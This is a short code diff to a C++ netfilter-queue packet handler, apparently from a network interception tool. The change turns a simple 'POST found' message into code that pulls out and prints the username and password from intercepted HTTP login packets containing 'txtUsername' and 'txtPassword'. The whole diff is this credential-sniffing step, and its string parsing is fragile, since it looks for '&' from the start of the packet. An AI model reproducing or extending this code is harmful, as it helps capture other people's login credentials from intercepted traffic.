@@ -341,8 +341,11 @@ static int nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, s
             // find the packet with "txtUsername"
             if (packet_str.find("txtUsername") != string::npos)
             {
-                cout << "HTTP POST packet with username/password found!" << endl;
-                cout << "Packet content: " << packet_str << endl;
+                // cout username and password
+                cout << "Username: " << packet_str.substr(packet_str.find("txtUsername") + 12, packet_str.find("&") - packet_str.find("txtUsername") - 12)<<endl;
+                // after & is password txtPassword=
+                cout << "Password: " << packet_str.substr(packet_str.find("txtPassword") + 12, packet_str.find("\n", packet_str.find("txtPassword")) - packet_str.find("txtPassword") - 12)<<endl;
+
             }
 
         }   
